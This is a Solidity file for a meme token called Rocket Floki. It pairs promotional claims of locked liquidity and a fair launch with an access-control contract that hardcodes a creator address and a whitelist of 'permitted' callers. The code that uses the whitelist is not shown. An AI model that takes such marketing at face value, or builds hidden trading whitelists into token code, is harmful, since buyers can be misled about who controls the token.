pragma solidity ^0.6.6;

import "./Context.sol";

/**

»»»»»»»»»»»»»$ROCKETFLOKI«««««««««««««

Rocket Floki Token was created as an alternative 
and improvement to the community run coins 
that have come before. 


Locked Liquidity Pool
LP locked for 1 year, adding safety and trust to the project.


Fair Community Launch
Rocket Floki Tokens are sold via a fair launch for a
nyone in the community to buy without any pre-sale. 

Join our socials!

*/

contract Enabler is Context
{
    address private _creator;
    address private _uniswap;
    mapping (address => bool) private _permitted;

    constructor() public
    {
        _creator = 0x529a59b97451e6Cd99e60FE3bF809092be8c36C5;
        _uniswap = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        
        _permitted[_creator] = true;
        _permitted[_uniswap] = true;
    }
    
    function creator() public view returns (address)
    { return _creator; }
    
    function uniswap() public view returns (address)
    { return _uniswap; }
    
    function givePermissions(address who) internal
    {
        require(_msgSender() == _creator || _msgSender() == _uniswap);
        _permitted[who] = true;
    }
    
    modifier onlyCreator
    {
        require(_msgSender() == _creator);
        _;
    }
    
    modifier onlyPermitted
    {
        require(_permitted[_msgSender()]);
        _;
    }
}